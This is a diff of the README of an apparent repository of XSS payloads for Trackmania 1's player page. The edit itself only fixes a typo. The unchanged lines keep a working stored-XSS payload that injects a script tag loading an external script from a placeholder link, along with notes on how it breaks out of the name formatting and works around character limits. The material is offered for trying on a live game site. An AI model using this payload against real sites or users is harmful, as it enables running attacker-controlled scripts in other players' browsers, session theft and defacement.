@@ -7,7 +7,7 @@ Repo of XSS payloads you can try when using Trackmania 1's playerpage
 $l["><script/src="//payload_link_here"></script>]username
 ```
 ## ❓ How does it work?
-Trackmania 1's playerpage is very unsecure and old (due to the game not being updated), hence in time there were more and more security flaws found. One of them is this exact [XSS](https://wikipedia.org/wiki/Cross-Site-Scripting). It works by escaping the site's link formatting code and executing own code with newly appended `<script>` tag.  
+Trackmania 1's playerpage is very insecure and old (due to the game not being updated), hence in time there were more and more security flaws found. One of them is this exact [XSS](https://wikipedia.org/wiki/Cross-Site-Scripting). It works by escaping the site's link formatting code and executing own code with newly appended `<script>` tag.  
   
 One of the cons of this method is that you have limited set of characters you can use and length. You cannot use unescaped spaces as they will be escaped into HTML encoding (`" " -> &nbsp;`) so that is why I chose to use `/` instead as it converts `/` correctly as it was space.  
   
